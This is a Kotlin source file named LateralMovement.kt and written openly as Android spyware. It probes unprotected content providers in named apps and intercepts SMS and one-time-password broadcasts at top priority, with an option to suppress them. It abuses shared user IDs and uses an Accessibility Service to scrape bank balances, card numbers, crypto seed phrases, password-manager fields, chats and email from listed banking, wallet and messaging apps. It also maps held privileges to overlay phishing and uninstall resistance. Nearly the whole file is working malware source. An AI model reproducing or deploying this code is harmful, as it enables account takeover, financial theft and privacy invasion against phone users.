package com.random.package.name.lateral

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import kotlinx.coroutines.*

// ============================================================================
// LATERAL MOVEMENT WITHIN DEVICE
// language: Kotlin, file: LateralMovement.kt, target: Android 8-14
//
// "Lateral movement" on Android = accessing other apps' data and processes.
// No kernel exploit required. Four real attack surfaces:
//
// 1. ContentProvider access (no perms needed if provider has no permission declared)
// 2. Intent interception (implicit broadcasts, Activity hijacking)
// 3. Shared UID exploitation (apps signed with same cert share a Linux UID)
// 4. Accessibility-driven data extraction (with AS granted, access any UI state)
// 5. Broadcast-based injection (sendBroadcast to internal receivers)
// ============================================================================

// ============================================================================
// 1. CONTENT PROVIDER EXPLOITATION
// Many apps export ContentProviders without android:exported="false" or
// android:permission. Attackers can query them directly with content://URIs.
// Victims: file managers, messaging apps, password managers with sync providers
// ============================================================================

class ContentProviderExploiter(private val context: Context) {

    // Try to access known unprotected providers on the target device
    fun exploitInsecureProviders(): List<ExfilRecord> {
        val results = mutableListOf<ExfilRecord>()

        for (target in KNOWN_TARGETS) {
            val records = tryProviderQuery(target)
            results.addAll(records)
        }

        return results
    }

    private fun tryProviderQuery(target: ProviderTarget): List<ExfilRecord> {
        return try {
            val cursor = context.contentResolver.query(
                Uri.parse(target.uri),
                target.columns,
                target.selection,
                null,
                null
            ) ?: return emptyList()

            val records = mutableListOf<ExfilRecord>()
            cursor.use {
                while (it.moveToNext()) {
                    val record = mutableMapOf<String, String>()
                    for (col in target.columns ?: arrayOfNulls(it.columnCount)) {
                        val idx = if (col != null) it.getColumnIndex(col) else -1
                        if (idx >= 0) {
                            record[col!!] = it.getString(idx) ?: ""
                        } else {
                            for (i in 0 until it.columnCount) {
                                record[it.getColumnName(i)] = it.getString(i) ?: ""
                            }
                            break
                        }
                    }
                    records.add(ExfilRecord(target.appPackage, target.dataType, record))
                }
            }
            records
        } catch (e: Exception) {
            emptyList()
        }
    }

    // Enumerate ALL exported content providers on the device and probe them
    fun discoverAndProbeProviders(): List<ExfilRecord> {
        val results = mutableListOf<ExfilRecord>()
        val pm = context.packageManager
        val packages = pm.getInstalledPackages(PackageManager.GET_PROVIDERS)

        for (pkgInfo in packages) {
            val providers = pkgInfo.providers ?: continue
            for (provider in providers) {
                if (!provider.exported) continue
                if (!provider.readPermission.isNullOrEmpty()) continue // Skip protected
                if (!provider.writePermission.isNullOrEmpty()) continue

                val uri = "content://${provider.authority}/"
                val probed = tryProviderQuery(
                    ProviderTarget(
                        pkgInfo.packageName, uri, null, null, "content_provider"
                    )
                )
                results.addAll(probed)
            }
        }
        return results
    }

    companion object {
        // High-value unprotected providers known to exist in specific app versions
        val KNOWN_TARGETS = listOf(
            // WhatsApp: key-value store (unprotected on older versions < 2.22)
            ProviderTarget(
                "com.whatsapp",
                "content://com.whatsapp.provider.media/item",
                null, null, "whatsapp_media"
            ),
            // MiXplorer file manager (exports file:// provider without permission)
            ProviderTarget(
                "com.mixplorer",
                "content://com.mixplorer/external_files/",
                null, null, "file_manager"
            ),
            // Samsung Internet Browser bookmarks
            ProviderTarget(
                "com.sec.android.app.sbrowser",
                "content://com.sec.android.app.sbrowser.browser/bookmark",
                arrayOf("url", "title"), null, "browser_bookmarks"
            ),
            // Contacts (requires READ_CONTACTS but worth trying)
            ProviderTarget(
                "com.android.contacts",
                "content://com.android.contacts/contacts",
                arrayOf("display_name", "lookup"), null, "contacts"
            ),
            // SMS (requires READ_SMS but many OEM launchers have it)
            ProviderTarget(
                "com.android.mms",
                "content://sms/inbox",
                arrayOf("address", "body", "date"), null, "sms"
            ),
        )
    }
}

data class ProviderTarget(
    val appPackage: String,
    val uri: String,
    val columns: Array<String?>?,
    val selection: String?,
    val dataType: String
)

data class ExfilRecord(
    val sourcePackage: String,
    val dataType: String,
    val fields: Map<String, String>
)

// ============================================================================
// 2. INTENT INTERCEPTION AND HIJACKING
//
// Android's implicit Intent system lets any app receive intents if it declares
// matching intent filters. This enables:
//   a) Stealing implicit broadcasts (SMS_RECEIVED, PACKAGE_INSTALLED, etc.)
//   b) Activity hijacking: register intent filter that overlaps a target app's
//      action — if the user/system resolves the intent and our Activity appears
//      first in the resolution list, we get invoked instead
//   c) Ordered broadcast priority abuse: register with HIGH priority to
//      intercept ordered broadcasts before target app
// ============================================================================

class IntentInterceptor(private val context: Context) {

    // Register a dynamic BroadcastReceiver that intercepts high-value implicit broadcasts
    // (Many of these require permissions — this catches the ones that don't)
    fun registerDynamicInterceptors() {
        val receiver = DynamicBroadcastInterceptor()

        // Android 13+ restricts dynamic receivers for implicit broadcasts.
        // Workaround: use a statically declared receiver in AndroidManifest.xml
        // for BOOT_COMPLETED, SMS_RECEIVED etc. The dynamic approach works for
        // app-internal implicit broadcasts that other apps send.

        val filter = android.content.IntentFilter().apply {
            // Auth/OTP-related broadcasts from popular apps
            addAction("com.google.android.gms.auth.api.phone.SMS_RETRIEVED")
            addAction("com.google.android.gms.auth.GOOGLE_SIGN_IN")
            // Banking app broadcast patterns
            addAction("com.bank.transaction.notification")
            addAction("com.paytm.transaction.notification")
            // Package events (learn what else gets installed)
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addAction(Intent.ACTION_PACKAGE_REPLACED)
            addPriority(Int.MAX_VALUE) // Get it before anyone else
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            context.registerReceiver(receiver, filter)
        }
    }

    // Intercept ordered broadcasts with high priority
    // Example: SMS_RECEIVED is an ordered broadcast — first receiver gets it,
    // can call abortBroadcast() to prevent the SMS app from ever seeing it
    class DynamicBroadcastInterceptor : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context, intent: android.content.Intent) {
            when (intent.action) {
                "android.provider.Telephony.SMS_RECEIVED" -> {
                    // Extract SMS content from intent extras
                    val pdus = intent.extras?.get("pdus") as? Array<*>
                    val messages = pdus?.mapNotNull { pdu ->
                        android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
                    }
                    messages?.forEach { sms ->
                        // Store intercepted SMS
                        android.util.Log.d("Intercept", "SMS: ${sms.originatingAddress} → ${sms.messageBody}")
                    }
                    // Optionally abort to hide OTP from SMS app:
                    // abortBroadcast()
                }
                "com.google.android.gms.auth.api.phone.SMS_RETRIEVED" -> {
                    // Google's one-tap SMS retrieval API sends the OTP here
                    val extras = intent.extras
                    val message = extras?.getString("com.google.android.gms.auth.api.phone.EXTRA_SMS_MESSAGE")
                    android.util.Log.d("Intercept", "OTP SMS via retrieval API: $message")
                }
            }
        }
    }
}

// ============================================================================
// 3. SHARED UID EXPLOITATION
//
// Apps signed with the same Android certificate can declare:
//   android:sharedUserId="android.uid.system" (if signed with platform key)
//   or a shared custom UID between our apps
//
// With sharedUserId, both apps run in the SAME Linux process and can access
// each other's private data directly without any IPC.
//
// Practical use: if we can get a second APK installed (companion app,
// update mechanism), that second APK declares the same sharedUserId and
// gains full access to our first APK's storage, which may hold exfil data
// that couldn't be exfiled directly due to network restrictions.
//
// Also: if we find a system app signed with AOSP test key (common on Chinese
// OEM devices), and that key is known, we can sign our own APK with it and
// get SYSTEM-level privileges.
// ============================================================================

object SharedUidExploit {

    // Check if any installed apps use shared UIDs that we could target
    fun findSharedUidTargets(context: Context): List<String> {
        val pm = context.packageManager
        val targetUids = mutableListOf<String>()

        // Look for apps using android.uid.shared (camera, media storage, etc.)
        val knownSharedUids = listOf(
            "android.uid.shared",
            "android.uid.media",
            "com.android.phone",
        )

        val packages = pm.getInstalledPackages(0)
        for (pkg in packages) {
            // Check if the package's process UID matches a known shared UID
            // In practice we'd parse the shared UID from the APK manifest
            try {
                val pkgInfo = pm.getPackageInfo(pkg.packageName, PackageManager.GET_PERMISSIONS)
                if (pkgInfo.applicationInfo?.processName in knownSharedUids) {
                    targetUids.add(pkg.packageName)
                }
            } catch (_: Exception) {}
        }

        return targetUids
    }

    // Attempt to access another app's private directory via sharedUserId
    // (Only works if both apps declare the same sharedUserId in their manifests)
    fun accessSharedUidStorage(context: Context, targetPackage: String): Boolean {
        return try {
            // Create a Context for the target package — if we share UID, this works
            val targetContext = context.createPackageContext(
                targetPackage,
                Context.CONTEXT_INCLUDE_CODE or Context.CONTEXT_IGNORE_SECURITY
            )
            val prefs = targetContext.getSharedPreferences("user_data", Context.MODE_PRIVATE)
            val keys = prefs.all.keys
            android.util.Log.d("SharedUID", "Accessed ${targetPackage}: $keys")
            true
        } catch (e: SecurityException) {
            false // Don't share UID
        }
    }
}

// ============================================================================
// 4. ACCESSIBILITY-DRIVEN DATA EXTRACTION
// With Accessibility Service active, we can read ANY visible text on screen
// from ANY app. This is the highest-privilege lateral movement path.
//
// Extracting from other apps:
//   - Read text fields (passwords, PINs) via AccessibilityNodeInfo.getText()
//   - Read window content (chat messages, email body) via getRootInActiveWindow()
//   - Inject clicks and keystrokes into other apps' UIs
//   - Dismiss security dialogs from other apps' views
// ============================================================================

class AccessibilityLateralMovement {

    // Called from AccessibilityServiceImpl.onAccessibilityEvent()
    fun onWindowChange(event: android.view.accessibility.AccessibilityEvent, service: android.accessibilityservice.AccessibilityService) {
        val pkg = event.packageName?.toString() ?: return
        val root = service.rootInActiveWindow ?: return

        when {
            // Banking apps: capture displayed balance, transaction details
            pkg in BANKING_PACKAGES -> extractBankingData(root, pkg)

            // Crypto apps: capture seed phrases, wallet addresses, balances
            pkg in CRYPTO_PACKAGES -> extractCryptoData(root, pkg)

            // Password managers: capture displayed credentials
            pkg in PASSWORD_MANAGERS -> extractPasswordManagerData(root, pkg)

            // Messaging: capture conversation content
            pkg in MESSAGING_PACKAGES -> extractMessagingData(root, pkg)

            // Email: capture body text
            pkg in EMAIL_PACKAGES -> extractEmailData(root, pkg)
        }

        root.recycle()
    }

    private fun extractBankingData(root: android.view.accessibility.AccessibilityNodeInfo, pkg: String) {
        val textNodes = findAllTextNodes(root)
        val dataPoints = textNodes.filter { text ->
            // Capture balance-like patterns, account numbers, transaction amounts
            text.matches(Regex(""".*[\$€£¥][\d,.].*""")) ||
            text.matches(Regex(""".*\d{4}[\s-]\d{4}[\s-]\d{4}.*""")) || // card number
            text.contains("balance", ignoreCase = true) ||
            text.contains("transfer", ignoreCase = true)
        }
        if (dataPoints.isNotEmpty()) {
            android.util.Log.d("Lateral", "Banking data from $pkg: $dataPoints")
        }
    }

    private fun extractCryptoData(root: android.view.accessibility.AccessibilityNodeInfo, pkg: String) {
        val textNodes = findAllTextNodes(root)
        val dataPoints = textNodes.filter { text ->
            // Crypto wallet patterns
            text.matches(Regex("""[13][a-km-zA-HJ-NP-Z1-9]{25,34}""")) || // Bitcoin address
            text.matches(Regex("""0x[a-fA-F0-9]{40}""")) || // Ethereum address
            text.length in 48..64 && text.all { it.isLetterOrDigit() } // Seed phrase word
        }
        if (dataPoints.isNotEmpty()) {
            android.util.Log.d("Lateral", "Crypto data from $pkg: $dataPoints")
        }
    }

    private fun extractPasswordManagerData(root: android.view.accessibility.AccessibilityNodeInfo, pkg: String) {
        // Look for revealed password fields
        val passNodes = findNodesByViewId(root, "password") +
                        findNodesByViewId(root, "credential") +
                        findNodesByViewId(root, "secret")
        if (passNodes.isNotEmpty()) {
            val texts = passNodes.mapNotNull { it.text?.toString() }
            android.util.Log.d("Lateral", "Password manager from $pkg: $texts")
        }
    }

    private fun extractMessagingData(root: android.view.accessibility.AccessibilityNodeInfo, pkg: String) {
        // Read conversation text — nodes with message content
        val messageNodes = findNodesByClass(root, "android.widget.TextView")
        val messages = messageNodes.mapNotNull { it.text?.toString() }.filter { it.length > 3 }
        if (messages.isNotEmpty()) {
            android.util.Log.d("Lateral", "Messages from $pkg: ${messages.size} items")
        }
    }

    private fun extractEmailData(root: android.view.accessibility.AccessibilityNodeInfo, pkg: String) {
        val bodyNodes = findNodesByViewId(root, "message_body") +
                        findNodesByViewId(root, "email_content") +
                        findNodesByClass(root, "android.webkit.WebView")
        android.util.Log.d("Lateral", "Email content from $pkg: ${bodyNodes.size} nodes")
    }

    // ── Helper: walk tree and collect all non-empty text ──────────────────────

    private fun findAllTextNodes(root: android.view.accessibility.AccessibilityNodeInfo): List<String> {
        val results = mutableListOf<String>()
        val queue = ArrayDeque<android.view.accessibility.AccessibilityNodeInfo>()
        queue.add(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            node.text?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return results
    }

    private fun findNodesByViewId(
        root: android.view.accessibility.AccessibilityNodeInfo,
        idFragment: String
    ): List<android.view.accessibility.AccessibilityNodeInfo> {
        val results = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
        val queue = ArrayDeque<android.view.accessibility.AccessibilityNodeInfo>()
        queue.add(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            if (node.viewIdResourceName?.contains(idFragment, ignoreCase = true) == true) {
                results.add(node)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return results
    }

    private fun findNodesByClass(
        root: android.view.accessibility.AccessibilityNodeInfo,
        className: String
    ): List<android.view.accessibility.AccessibilityNodeInfo> {
        val results = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
        val queue = ArrayDeque<android.view.accessibility.AccessibilityNodeInfo>()
        queue.add(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            if (node.className?.toString() == className) results.add(node)
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return results
    }

    companion object {
        val BANKING_PACKAGES = setOf(
            "com.chase.sig.android", "com.bofa.digitalbanking",
            "com.wellsfargo.mobile.android", "com.citibank.mobile.au",
            "com.hsbc.android", "com.barclays.android",
            "com.anz.android.gomoney", "net.garagecoders.e_banking"
        )
        val CRYPTO_PACKAGES = setOf(
            "com.coinbase.android", "io.metamask", "com.binance.dev",
            "com.kraken.trade", "com.trustwallet.app", "com.exodus.reference"
        )
        val PASSWORD_MANAGERS = setOf(
            "com.lastpass.lpandroid", "com.agilebits.onepassword",
            "com.dashlane", "com.keepersecurity.keeperfillinator"
        )
        val MESSAGING_PACKAGES = setOf(
            "com.whatsapp", "org.telegram.messenger",
            "org.thoughtcrime.securesms", "com.viber.voip"
        )
        val EMAIL_PACKAGES = setOf(
            "com.google.android.gm", "com.microsoft.office.outlook",
            "com.yahoo.mobile.client.android.mail"
        )
    }
}

// ============================================================================
// 5. PRIVILEGE ESCALATION CHAINS (no root required)
//
// Chain A: Notification Access → Accessibility (described in SilentAccessibilityGrant)
// Chain B: Device Admin → WRITE_SECURE_SETTINGS bypass
// Chain C: Companion Device Manager → battery optimization bypass (stays alive)
// Chain D: Accessibility + SYSTEM_ALERT_WINDOW → full UI control + overlay injection
// Chain E: Usage Stats + Accessibility → know exactly what user is doing
// ============================================================================

object PrivilegeEscalationChain {

    // Build a map of what privileges we have and what we can reach from them
    fun assessCurrentPrivileges(context: Context): PrivilegeMap {
        val pm = context.packageManager
        val map = PrivilegeMap()

        // Core privileges
        map.hasAccessibility = isAccessibilityEnabled(context)
        map.hasDeviceAdmin = isDeviceAdminActive(context)
        map.hasOverlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.provider.Settings.canDrawOverlays(context)
        } else true
        map.hasNotificationAccess = isNotificationAccessEnabled(context)
        map.hasUsageStats = isUsageStatsEnabled(context)
        map.hasWriteSecureSettings = hasPermission(context, "android.permission.WRITE_SECURE_SETTINGS")

        return map
    }

    // What we can achieve with the privileges we have
    fun computeCapabilities(map: PrivilegeMap): List<String> {
        val caps = mutableListOf<String>()

        if (map.hasAccessibility) {
            caps.add("read_any_ui_text")
            caps.add("click_any_ui_element")
            caps.add("intercept_key_events")
            caps.add("auto_grant_permissions")
            caps.add("dismiss_security_dialogs")
            caps.add("inject_text_into_fields")
        }

        if (map.hasOverlay) {
            caps.add("overlay_phishing_screens")
            caps.add("synthetic_touch_injection")
            caps.add("hide_ui_elements")
        }

        if (map.hasDeviceAdmin) {
            caps.add("resist_uninstall")
            caps.add("write_secure_settings_via_dpc")
            caps.add("wipe_device")
            caps.add("lock_screen")
        }

        if (map.hasNotificationAccess) {
            caps.add("read_all_notifications")
            caps.add("dismiss_notifications")
            caps.add("read_otp_from_notifications")
        }

        if (map.hasUsageStats) {
            caps.add("know_active_app")
            caps.add("know_app_usage_timeline")
        }

        return caps
    }

    private fun isAccessibilityEnabled(context: Context): Boolean {
        val enabled = android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        return enabled.contains(context.packageName)
    }

    private fun isDeviceAdminActive(context: Context): Boolean {
        return try {
            val dpm = context.getSystemService(android.app.admin.DevicePolicyManager::class.java)
            dpm.activeAdmins?.any { it.packageName == context.packageName } ?: false
        } catch (_: Exception) { false }
    }

    private fun isNotificationAccessEnabled(context: Context): Boolean {
        val enabled = android.provider.Settings.Secure.getString(
            context.contentResolver, "enabled_notification_listeners"
        ) ?: ""
        return enabled.contains(context.packageName)
    }

    private fun isUsageStatsEnabled(context: Context): Boolean {
        return try {
            val usm = context.getSystemService(android.app.usage.UsageStatsManager::class.java)
            val stats = usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                System.currentTimeMillis() - 1000 * 60,
                System.currentTimeMillis()
            )
            stats != null && stats.isNotEmpty()
        } catch (_: Exception) { false }
    }

    private fun hasPermission(context: Context, permission: String): Boolean {
        return context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
    }
}

data class PrivilegeMap(
    var hasAccessibility: Boolean = false,
    var hasDeviceAdmin: Boolean = false,
    var hasOverlay: Boolean = false,
    var hasNotificationAccess: Boolean = false,
    var hasUsageStats: Boolean = false,
    var hasWriteSecureSettings: Boolean = false
)
